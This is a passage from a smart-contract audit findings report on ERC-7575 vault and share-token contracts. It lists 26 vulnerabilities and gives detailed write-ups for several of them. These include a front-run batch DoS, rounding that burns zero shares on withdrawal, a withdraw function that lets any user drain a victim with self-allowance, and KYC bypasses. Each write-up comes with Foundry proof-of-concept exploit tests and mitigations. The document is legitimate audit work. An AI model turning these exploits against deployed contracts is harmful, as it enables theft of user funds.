# 2025 11 sukukfi - Findings Report
## Commit hash: d7e734192a571511f47962e7f228ad5ed275e7db

##Findings by Pattern


 **Derived From** : GriefableCallbacks

[L-1]. Batch Fulfillment DoS via Front-Run Cancelation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
[M-2]. System-wide DoS via Unregistrable Broken Vault
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresAdminRole



 **Derived From** : PricePrecision

[M-3]. Precision Loss in withdraw allows draining assets and creating phantom shares
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : AccessControlOrAuthByPass

[H-4]. Access Control Bypass in `WERC7575Vault.withdraw` allows asset theft
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
[M-5]. Investment ShareToken allows permissionless transfers bypassing KYC/Permit
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless
[L-6]. Access Control Bypass in Batch Transfers
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : ERC4626SharePriceMismatch

[M-7]. Insufficient Virtual Offset in ShareTokenUpgradeable allows Inflation Attack
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless
[H-8]. Phantom Liquidity and Insolvency via rBalance Pricing Mismatch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : StorageCollisionOrSelectorClash

[H-9]. Storage Collision Risk via Non-Upgradeable ReentrancyGuard in Upgradeable Contract
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : PermitFrontRun

[L-10]. Permit Front-Running DoS in WERC7575ShareToken
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless



 **Derived From** : ERC7575VaultUpgradeable.activeDepositRequesters

[M-11]. State Desynchronization in `activeDepositRequesters` via `cancelDepositRequest`
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : SlippageMissingOrInsufficient

[M-12]. Missing Slippage Protection in Fulfillment and Investment Operations
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole
[M-13]. Missing Slippage Protection in Investment Operations
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole
[M-14]. Missing Slippage Protection in Async Request Functions
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : StandardViolation

[L-15]. ERC4626 Semantic Violation in Async Vault
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Invariant Type: Referential

[M-16]. Premature removal of users from activeDepositRequesters in deposit/mint hides pending requests
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : StateGrowthOrStorageBloat

[M-17]. Permanent DoS of unregisterVault via Dust Accounts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[M-18]. Permanent DoS of Vault Unregistration via Dust Accounts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Invariant: totalAssets() calculation accurately reflects net liquid assets without arbitrary clamping that distorts share price

[H-19]. Share Price Manipulation via Insolvency Clamping in totalAssets()
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresRole



 **Derived From** : ERC7575VaultUpgradeable.totalAssets

[H-20]. Share Price Inflation via fulfillRedeem during Liquidity Crunch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresRole



 **Derived From** : AccountingInvariantViolation

[M-21]. Profit Realization Logic Contradicts Specification
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole
[H-22]. Yield Distribution Failure: adjustrBalance locks yield in non-withdrawable rBalance
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresAdminRole
[M-23]. Storage Layout Collision Risk via Non-Upgradeable ReentrancyGuard
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresAdminRole



 **Derived From** : ReserveOrPriceDesync

[M-24]. Loss Avoidance via Front-running adjustrBalance
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Reentrancy

[H-25]. Cross-Vault Read-Only Reentrancy via requestDeposit
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : ForcedAssetVsStrictEquality

[M-26]. DoS on Vault Unregistration via Dust Donation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 7
- M: 15
- L: 4
- I: 0

##Findings by Pattern


 **Derived From** : GriefableCallbacks

## [L-1]. Batch Fulfillment DoS via Front-Run Cancelation

### Finding Severity Justification: This is a Denial of Service (DoS) of a batch operation caused by a race condition (front-running). While the finding correctly identifies that a single user canceling their request can revert the entire `fulfillDeposits` batch transaction, the severity is Low for several reasons: 1) The caller (Investment Manager) has full control over the input array and can simply exclude the problematic user in a retry transaction. 2) The attacker must lock their capital to perform the attack (funds move to 'pending cancelation' state which requires Manager action to release), acting as a significant economic deterrent against griefing. 3) The `fulfillDeposit` (singular) function exists as a fallback. 4) The impact is limited to gas waste for the Investment Manager and operational friction, without permanent loss of funds or permanent blocking of protocol functionality.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
ERC7575VaultUpgradeable.fulfillDeposits

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `fulfillDeposits` function processes a batch of controllers. Inside the loop, it calls `fulfillDeposit`, which strictly reverts if `assets > pendingDepositAssets[controller]`. A malicious user can submit a deposit request and, upon observing a pending `fulfillDeposits` transaction targeting them, front-run it with `cancelDepositRequest`. This sets their pending assets to zero (or moves them to cancelation state). The manager's batch transaction then reverts due to the check failure for that single user, blocking the entire batch.

## Impact
Denial of Service for investment manager operations; prevents efficient batch processing of deposits.

## Command to Run Test


## Proof of Concept
1. Attacker requests deposit.
2. Manager submits `fulfillDeposits([attacker, user2])`.
3. Attacker front-runs with `cancelDepositRequest`.
4. `fulfillDeposits` executes: fails on attacker's index because `pendingDepositAssets` is now 0.
5. Entire transaction reverts; user2 is not fulfilled.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAsset is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract BatchDoSTest is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockAsset asset;

    address manager = address(0xAAAA);
    address attacker = address(0xBBBB);
    address user2 = address(0xCCCC);

    function setUp() public {
        vm.startPrank(manager);
        
        // 1. Deploy System
        asset = new MockAsset();
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Share", "SHR", manager);
        
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(IERC20Metadata(address(asset)), address(shareToken), manager);
        
        // 2. Configure System
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setKycAdmin(manager);
        shareToken.setKycVerified(attacker, true);
        shareToken.setKycVerified(user2, true);
        
        vm.stopPrank();

        // 3. Fund Users
        asset.mint(attacker, 10000e18);
        asset.mint(user2, 10000e18);
    }

    function testBatchFulfillmentDoS() public {
        uint256 amount = 2000e18; // > min deposit (1000 * 10^decimals)

        // 1. Attacker requests deposit
        vm.startPrank(attacker);
        asset.approve(address(vault), amount);
        vault.requestDeposit(amount, attacker, attacker);
        vm.stopPrank();

        // 2. User2 requests deposit
        vm.startPrank(user2);
        asset.approve(address(vault), amount);
        vault.requestDeposit(amount, user2, user2);
        vm.stopPrank();

        // 3. Attacker front-runs with cancel
        vm.prank(attacker);
        vault.cancelDepositRequest(0, attacker);

        // 4. Manager tries to fulfill both in a batch
        address[] memory controllers = new address[](2);
        controllers[0] = attacker;
        controllers[1] = user2;
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = amount;
        amounts[1] = amount;

        vm.startPrank(manager);
        // Expect revert due to insufficient pending assets for attacker (reset to 0 on cancel)
        // Reverts with: ERC20InsufficientBalance(address(this), 0, amount)
        vm.expectRevert(); 
        vault.fulfillDeposits(controllers, amounts);
        vm.stopPrank();
    }
}

## Suggested Mitigation
In `fulfillDeposits`, use a try/catch pattern or simply skip controllers with insufficient pending assets instead of reverting.


## [M-2]. System-wide DoS via Unregistrable Broken Vault

### Finding Severity Justification: The vulnerability creates a system-wide Denial of Service. The `ShareTokenUpgradeable` iterates over all registered vaults in `getCirculatingSupplyAndAssets`, which is critical for share conversion in `deposit`, `mint`, `withdraw`, and `redeem` across ALL vaults. If a single vault becomes dysfunctional (e.g., due to a buggy upgrade or corrupted state) and reverts on `getVaultMetrics` or `getClaimableSharesAndNormalizedAssets`, all operations in all vaults will revert. Crucially, the `unregisterVault` function explicitly reverts if it cannot fetch metrics from the vault, preventing the admin from removing the broken vault to restore system health. This turns a local failure (one broken vault) into a permanent global failure, fitting the 'Critical Impact + Rare Likelihood = Medium' criteria.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
ShareTokenUpgradeable.unregisterVault

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
`ShareTokenUpgradeable.unregisterVault` calls `IVaultMetrics(vaultAddress).getVaultMetrics()`. If a vault is broken (e.g., buggy upgrade or paused state causing reverts), this call will fail. Consequently, the broken vault cannot be unregistered. This effectively bricks the registry slot and potentially affects system-wide aggregation functions if they iterate over registered vaults.

## Impact
A broken vault (e.g., one that reverts due to a buggy upgrade or corrupted state) causes a system-wide Denial of Service by blocking `getCirculatingSupplyAndAssets`, which is critical for share conversion across all vaults. The `unregisterVault` function, intended to resolve such issues, permanently fails because it performs a safety check (`getVaultMetrics`) that also reverts when the vault is broken, creating a permanent system deadlock.

## Command to Run Test


## Proof of Concept
1. Deploy `ShareToken` and register a functional `Vault A`.
2. Register `Vault B`.
3. `Vault B` enters a broken state (e.g., buggy upgrade) where it reverts on all calls.
4. Any user calling `deposit` or `mint` on `Vault A` fails because `ShareToken` aggregates data from all vaults including `Vault B`.
5. Admin calls `unregisterVault(Vault B)` to fix the system.
6. The call reverts because `ShareToken`'s safety check catches the error from `Vault B` but then explicitly reverts with `CannotUnregisterActiveVault` inside the catch block.
7. The broken vault cannot be removed; the system remains permanently DoSed.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";

contract MockBrokenVault {
    address public _asset;
    address public _share;
    constructor(address a, address s) { _asset = a; _share = s; }
    function asset() external view returns (address) { return _asset; }
    function share() external view returns (address) { return _share; }
    function getVaultMetrics() external pure { revert("Broken"); }
    function getClaimableSharesAndNormalizedAssets() external pure { revert("Broken"); }
}

contract BrokenVaultTest is Test {
    ShareTokenUpgradeable token;
    address owner = address(0x1);
    address asset = address(0x10);

    function setUp() public {
        vm.startPrank(owner);
        token = new ShareTokenUpgradeable();
        token.initialize("Share", "SHR", owner);
        vm.stopPrank();
    }

    function testUnregisterDeadlock() public {
        MockBrokenVault broken = new MockBrokenVault(asset, address(token));
        
        vm.startPrank(owner);
        token.registerVault(asset, address(broken));

        // 1. Prove System DoS: Aggregation fails due to broken vault
        vm.expectRevert("Broken");
        token.getCirculatingSupplyAndAssets();

        // 2. Prove Unregister Lock: Cannot remove broken vault
        // The catch block in unregisterVault catches "Broken" but reverts with CannotUnregisterActiveVault
        vm.expectRevert(abi.encodeWithSignature("CannotUnregisterActiveVault()"));
        token.unregisterVault(asset);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Implement a `forceUnregisterVault` function restricted to the owner that bypasses the `getVaultMetrics` safety check. This allows the admin to remove a broken vault that is causing a system-wide DoS, even if the vault is unresponsive.





 **Derived From** : PricePrecision

## [M-3]. Precision Loss in withdraw allows draining assets and creating phantom shares

### Finding Severity Justification: The use of `Math.Rounding.Floor` in `withdraw` incorrectly favors the user by burning fewer (or zero) shares than required, violating the ERC-4626 security standard which requires rounding in favor of the vault (Ceil for withdrawals). While the report's claim of 'share dilution' is incorrect (as `circulatingSupply` correctly excludes vault-held shares), the exploit allows a user to drain assets while leaving 'phantom shares' in the vault. These lingering shares keep the user in the `activeRedeemRequesters` set, which blocks the `unregisterVault` function. A malicious actor can exploit this to permanently lock a vault slot, and since the `ShareToken` has a hard cap of 10 vaults (`MAX_VAULTS_PER_SHARE_TOKEN`), this leads to a Denial of Service (DoS) of the multi-asset registry.
## Derived From Pattern/Invariant
PricePrecision

## Exploit Type
RoundingError

## Location
ERC7575VaultUpgradeable.withdraw

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdraw` function in `ERC7575VaultUpgradeable` calculates the shares to burn using `Math.Rounding.Floor`: `shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor)`. If `assets` is small relative to the share/asset ratio, the result can round down to 0. The code subsequently decreases `claimableRedeemAssets` by `assets` but `claimableRedeemShares` by 0. An attacker can repeatedly withdraw small amounts ('dust') to drain `claimableRedeemAssets` without burning any `claimableRedeemShares`. This leaves 'phantom shares' in the vault that are considered part of the circulating supply but have no backing assets, manipulating the share price.

## Impact
The incorrect rounding direction (Floor) in `withdraw` allows a user to withdraw small amounts of assets ('dust') without burning the corresponding shares. This results in 'phantom shares' persisting in the `claimableRedeemShares` mapping even after significant assets are removed. Crucially, because the user retains a non-zero share balance, they are never removed from the `activeRedeemRequesters` set. This permanently blocks the `unregisterVault` function (which requires 0 active requesters), allowing a malicious user to cause a Denial of Service (DoS) on the multi-asset registry system by locking a vault slot indefinitely.

## Command to Run Test


## Proof of Concept
1. Assume a Vault has a high share price in the claimable state, e.g., 1 Share = 10 Assets. (User requested 10 shares, fulfilled for 100 assets).
2. User calls `withdraw(9 assets, ...)`.
3. The Vault calculates `shares = assets * (availableShares / availableAssets) = 9 * (10 / 100) = 0.9`.
4. `Math.Rounding.Floor` rounds `0.9` down to `0`.
5. User receives 9 assets, but 0 shares are burned. `claimableRedeemAssets` decreases to 91, `claimableRedeemShares` remains 10.
6. The user effectively extracts assets while retaining their full share claim.
7. Since `claimableRedeemShares` remains > 0, the user remains in the `activeRedeemRequesters` list, preventing the vault from ever being unregistered via `unregisterVault`.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ERC7575VaultUpgradeable} from "src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "src/ShareTokenUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockAsset is ERC20 {
    constructor() ERC20("Asset", "AST") { _mint(msg.sender, 1000000e18); }
}

contract VaultRoundingTest is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vault;
    MockAsset asset;
    address owner = address(0x1);
    address user = address(0x2);

    function setUp() public {
        vm.startPrank(owner);
        asset = new MockAsset();
        
        // Deploy Proxies
        shareToken = ShareTokenUpgradeable(address(new ERC1967Proxy(address(new ShareTokenUpgradeable()), "")));
        shareToken.initialize("Share", "SHR", owner);
        
        vault = ERC7575VaultUpgradeable(address(new ERC1967Proxy(address(new ERC7575VaultUpgradeable()), "")));
        vault.initialize(asset, address(shareToken), owner);
        
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(owner);
        vm.stopPrank();
        
        asset.transfer(user, 10000e18);
    }

    function test_WithdrawRoundingDoS() public {
        // 1. Setup: User gets shares and creates a high asset:share ratio
        vm.startPrank(user);
        asset.approve(address(vault), 100e18);
        vault.requestDeposit(100e18, user, user);
        vm.stopPrank();
        
        vm.prank(owner);
        vault.fulfillDeposit(user, 100e18);
        
        vm.prank(user);
        vault.mint(100e18, user, user); // User gets 100 shares

        // Pump price: Donate assets to make 1 share worth > 1 asset
        // Current: 100 shares, 100 assets. Ratio 1:1.
        // Donate 900 assets. Total 1000 assets. Ratio 1:10.
        vm.prank(user);
        asset.transfer(address(vault), 900e18);

        // 2. User requests redeem of 10 shares
        vm.startPrank(user);
        // shareToken.approve not needed due to vaultTransferFrom logic for vaults
        vault.requestRedeem(10e18, user, user);
        vm.stopPrank();

        // 3. Fulfill: 10 shares = 100 assets (at 1:10 ratio)
        vm.prank(owner);
        vault.fulfillRedeem(user, 10e18);

        // 4. Exploit: Withdraw 9 assets (dust)
        // shares = 9 * (10 shares / 100 assets) = 0.9 -> 0 shares burned
        uint256 claimableSharesBefore = vault.claimableRedeemRequest(0, user);
        
        vm.prank(user);
        vault.withdraw(9e18, user, user);
        
        uint256 claimableSharesAfter = vault.claimableRedeemRequest(0, user);
        
        // Verify phantom shares remain
        assertEq(claimableSharesAfter, claimableSharesBefore, "Shares should not burn due to floor rounding");
        
        // Verify DoS condition: User is still an active requester
        address[] memory actives = vault.getActiveRedeemRequesters();
        assertEq(actives.length, 1);
        assertEq(actives[0], user);
        
        // Attempt unregister (should fail)
        vm.startPrank(owner);
        vault.setVaultActive(false);
        vm.expectRevert(); // CannotUnregisterVaultActiveRedeemRequesters
        shareToken.unregisterVault(address(asset));
        vm.stopPrank();
    }
}

## Suggested Mitigation
Modify the `withdraw` function in `ERC7575VaultUpgradeable` to use `Math.Rounding.Ceil` when calculating the shares to burn. This complies with the ERC-4626 standard (assets-to-shares withdrawals round up) and prevents the creation of phantom shares by ensuring at least 1 wei of shares is burned for any non-zero asset withdrawal.

```solidity
// In withdraw function:
shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Ceil);
```





 **Derived From** : AccessControlOrAuthByPass

## [H-4]. Access Control Bypass in `WERC7575Vault.withdraw` allows asset theft

### Finding Severity Justification: The vulnerability allows any user to steal funds from another user who has a valid self-allowance set. Since setting self-allowance is a prerequisite for legitimate withdrawals in this protocol, users are naturally exposed to this theft vector. The impact is direct loss of funds with no special privileges required by the attacker.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
WERC7575Vault.withdraw

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdraw` function in `WERC7575Vault` allows any user to withdraw assets belonging to another user (`owner`), provided the `owner` has a self-allowance set (which is required for normal operation). The function calls `_shareToken.spendSelfAllowance(owner, shares)`, which checks `allowance[owner][owner]`, but fails to verify that `msg.sender` is either the `owner` or has been approved by the `owner` (i.e., `allowance[owner][msg.sender]`). This allows an attacker to specify a victim's address as `owner` and themselves as `receiver`, effectively draining the victim's funds.

## Impact
Direct theft of user funds. Any user who has a valid self-allowance (validator permit) can be drained by any other user.

## Command to Run Test


## Proof of Concept
1. Victim obtains a validator-signed permit and sets self-allowance (required to use the protocol).
2. Attacker calls `WERC7575Vault.withdraw(assets, attackerAddress, victimAddress)`.
3. The vault calls `_shareToken.spendSelfAllowance(victim, shares)` which succeeds because the victim has self-allowance.
4. The vault burns the victim's shares.
5. The vault transfers the assets to the attacker.

## Proof of Code
function testExploitWithdraw() public {
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);
    uint256 amount = 1000e6;
    uint256 shares = vault.convertToShares(amount);

    // 1. Fund Vault
    deal(address(vault.asset()), address(vault), amount);

    // 2. Mint shares to victim (requires vault privilege)
    // We prank the vault to mint, which updates the correct internal balances
    vm.prank(address(vault));
    shareToken.mint(victim, shares);

    // 3. Set Victim's Self-Allowance (Protocol Pre-requisite)
    // 'approve' reverts on self-approval, so we use storage manipulation to simulate a validator-signed permit.
    // In OpenZeppelin ERC20, _allowances is typically at slot 1.
    // Slot = keccak256(spender, keccak256(owner, slot_index))
    bytes32 slot = keccak256(abi.encode(victim, keccak256(abi.encode(victim, uint256(1)))));
    vm.store(address(shareToken), slot, bytes32(type(uint256).max));

    // 4. Ensure Victim is KYC Verified (Required for burn)
    vm.prank(shareToken.owner());
    shareToken.setKycVerified(victim, true);

    // 5. Attacker drains victim
    vm.prank(attacker);
    vault.withdraw(amount, attacker, victim);

    // Verify theft
    assertEq(IERC20(vault.asset()).balanceOf(attacker), amount);
    assertEq(shareToken.balanceOf(victim), 0);
}

## Suggested Mitigation
1. Modify `WERC7575ShareToken` to add a function: `function spendAllowance(address owner, address spender, uint256 amount) external onlyVaults { _spendAllowance(owner, spender, amount); }`. 
2. Update `WERC7575Vault.withdraw` to enforce standard access control while maintaining the protocol's self-allowance requirement:
```solidity
if (msg.sender != owner) {
    _shareToken.spendAllowance(owner, msg.sender, shares);
}
// Always consume self-allowance as per protocol design
_shareToken.spendSelfAllowance(owner, shares);
```


## [M-5]. Investment ShareToken allows permissionless transfers bypassing KYC/Permit

### Finding Severity Justification: The finding identifies a missing access control mechanism (KYC/Permit checks) in the Investment Token (`ShareTokenUpgradeable`), which is present in the Settlement Token (`WERC7575ShareToken`). This omission allows unauthorized (non-KYC) users to hold and transfer investment tokens, violating the protocol's core requirement of being a 'regulated' and 'compliant' ecosystem. While this does not lead to direct fund theft, it breaches the permissioned nature of the protocol (Access Control Bypass) and poses significant regulatory/legal risks, fitting the criteria for Medium severity.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
ShareTokenUpgradeable.transfer

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ShareTokenUpgradeable` (Investment Token) inherits `ERC20Upgradeable` but does not override `transfer`/`transferFrom` to enforce the KYC and Permit restrictions present in the Settlement Token (`WERC7575ShareToken`). This allows unverified users to hold and transfer investment tokens, violating the protocol's regulatory compliance requirements described in the documentation.

## Impact
Regulatory non-compliance and loss of transfer control. The protocol documentation specifies a regulated environment where transfers must be gated by KYC and Validator Permits. The current implementation allows unrestricted peer-to-peer transfers, enabling sanctioned or unverified entities to hold securities (Investment Shares) and bypassing the Validator's control over token movement (Access Control Bypass).

## Command to Run Test


## Proof of Concept
1. Deploy `ShareTokenUpgradeable` behind a proxy and initialize it.
2. Register a mock Vault address to gain minting privileges.
3. Mint 1,000 tokens to `User A`.
4. `User A` calls `transfer(User B, 1,000)` directly.
5. The transfer succeeds immediately without checking if `User B` is KYC verified and without requiring `User A` to have a Validator-signed Permit (self-allowance).
6. This demonstrates that the Investment Token behaves as a permissionless ERC20, violating the protocol's compliance requirements enforced in the Settlement Token.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {ShareTokenUpgradeable} from "src/ShareTokenUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MockVault {
    function asset() external view returns (address) { return address(0x123); }
    function share() external view returns (address) { return msg.sender; }
}

contract ShareTokenKYCTest is Test {
    ShareTokenUpgradeable token;
    address owner = address(0x1);
    address userA = address(0x2);
    address userB = address(0x3);
    address vault = address(0x4);

    function setUp() public {
        vm.startPrank(owner);
        ShareTokenUpgradeable implementation = new ShareTokenUpgradeable();
        bytes memory initData = abi.encodeCall(ShareTokenUpgradeable.initialize, ("InvToken", "INV", owner));
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        token = ShareTokenUpgradeable(address(proxy));
        
        // Mock vault setup for registration validation
        vm.mockCall(vault, abi.encodeWithSignature("asset()"), abi.encode(address(0x999)));
        vm.mockCall(vault, abi.encodeWithSignature("share()"), abi.encode(address(token)));
        
        token.registerVault(address(0x999), vault);
        vm.stopPrank();
    }

    function testBypassKYCAndPermit() public {
        // 1. Mint tokens to User A (simulating valid deposit via vault)
        vm.prank(vault);
        token.mint(userA, 1000e18);

        // 2. User A transfers to User B (arbitrary address, no KYC, no permit)
        vm.prank(userA);
        token.transfer(userB, 1000e18);

        // 3. Assert transfer succeeded (Proof of Vulnerability)
        assertEq(token.balanceOf(userB), 1000e18);
        // Note: WERC7575ShareToken would revert here with KycRequired() or insufficient allowance
    }
}

## Suggested Mitigation
1. Update `ShareTokenStorage` struct to include `mapping(address => bool) isKycVerified` and `address kycAdmin`.
2. Add administrative functions `setKycVerified` and `setKycAdmin` restricted to `onlyOwner` or `onlyKycAdmin`.
3. Override `transfer` and `transferFrom` to enforce KYC and Validator Permit logic (matching `WERC7575ShareToken`):
```solidity
function transfer(address to, uint256 value) public override returns (bool) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    if (!$.isKycVerified[to]) revert KycRequired();
    _spendAllowance(msg.sender, msg.sender, value); // Enforce Validator Permit
    return super.transfer(to, value);
}

function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    if (!$.isKycVerified[to]) revert KycRequired();
    _spendAllowance(from, from, value); // Enforce Validator Permit
    return super.transferFrom(from, to, value);
}
```


## [L-6]. Access Control Bypass in Batch Transfers

### Finding Severity Justification: While the finding correctly identifies that `batchTransfers` bypasses the `isKycVerified` check enforced in other state-changing functions (violating Main Invariant #5), the function is restricted to the `onlyValidator` role. Per the contest rules and C4 standard procedure for Trusted Roles (Gate 5), errors or misuse by trusted admins that do not result in direct fund theft or protocol bricking are classified as Governance/Centralization Risk (Low/QA). The Validator is explicitly listed as a TRUSTED role.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
WERC7575ShareToken.batchTransfers

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `batchTransfers` function allows the Validator to transfer tokens between addresses by updating `_balances` directly. Crucially, it does not check `isKycVerified` for the recipients, whereas `transfer` and `transferFrom` do. This allows the Validator to bypass the KYC compliance restrictions enforced elsewhere in the protocol.

## Impact
Violates the protocol's compliance invariant that restricts token ownership to KYC-verified addresses. By utilizing `batchTransfers`, the Validator can unilaterally bypass the access controls managed by the `KycAdmin`, allowing unverified or sanctioned entities to receive and hold tokens.

## Command to Run Test


## Proof of Concept
The `WERC7575ShareToken` separates the `Validator` role (settlement) from the `KycAdmin` role (compliance). While `transfer` and `transferFrom` explicitly enforce `if (!isKycVerified[to]) revert KycRequired();`, the `batchTransfers` function iterates through transfers and updates `_balances` directly without this check. A compromised or malicious Validator can exploit this to send tokens to non-KYC'd addresses.

## Proof of Code
function test_AccessControl_BatchTransfer_BypassesKYC() public {
    // 1. Setup: Define distinct Validator and KYC Admin
    address owner = address(this);
    address validator = address(0x123);
    address kycAdmin = address(0x456);
    address sender = address(0x789);
    address nonKycReceiver = address(0xBAD);
    address mockVault = address(0x999);
    address mockAsset = address(0x888);

    // 2. Initialize Token
    WERC7575ShareToken token = new WERC7575ShareToken("Test", "TST");
    token.setValidator(validator);
    token.setKycAdmin(kycAdmin);

    // 3. Register a mock vault to allow minting to sender
    vm.mockCall(mockVault, abi.encodeWithSelector(IERC7575.asset.selector), abi.encode(mockAsset));
    vm.mockCall(mockVault, abi.encodeWithSelector(IERC7575.share.selector), abi.encode(address(token)));
    token.registerVault(mockAsset, mockVault);

    // 4. KYC the sender so they can hold initial funds
    vm.prank(kycAdmin);
    token.setKycVerified(sender, true);

    // 5. Mint funds to sender
    vm.prank(mockVault);
    token.mint(sender, 1000 ether);

    // 6. Execute batchTransfer as Validator to non-KYC recipient
    address[] memory debtors = new address[](1);
    address[] memory creditors = new address[](1);
    uint256[] memory amounts = new uint256[](1);
    debtors[0] = sender;
    creditors[0] = nonKycReceiver;
    amounts[0] = 100 ether;

    vm.prank(validator);
    token.batchTransfers(debtors, creditors, amounts);

    // 7. Verify the non-KYC address received funds
    assertEq(token.balanceOf(nonKycReceiver), 100 ether);
    assertEq(token.isKycVerified(nonKycReceiver), false);
}

## Suggested Mitigation
Add a validation loop at the beginning of `batchTransfers` (and `rBatchTransfers`) to verify all creditors are KYC approved, matching the behavior of standard transfers.

```solidity
function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {
    for (uint256 i = 0; i < creditors.length; i++) {
        if (!isKycVerified[creditors[i]]) revert KycRequired();
    }
    // ... existing logic ...
}
```





 **Derived From** : ERC4626SharePriceMismatch

## [M-7]. Insufficient Virtual Offset in ShareTokenUpgradeable allows Inflation Attack

### Finding Severity Justification: The VIRTUAL_SHARES constant (1e6) is insufficient for a system that normalizes all assets to 18 decimals. Standard ERC4626 inflation protection recommends an offset equal to 10**decimals (1e18). With the current 1e6 offset, the protection is 10^12 times weaker than standard. This means an attacker needs only a 1,000,000:1 ratio of donation-to-deposit to round a victim's shares to zero. For an 18-decimal token, stealing 1 token requires a 1M token donation (feasible via flash loans/whales), and stealing smaller amounts (e.g., 0.01 tokens) is cheap and easy. This deviation creates unnecessary precision loss and griefing vectors for small depositors.
## Derived From Pattern/Invariant
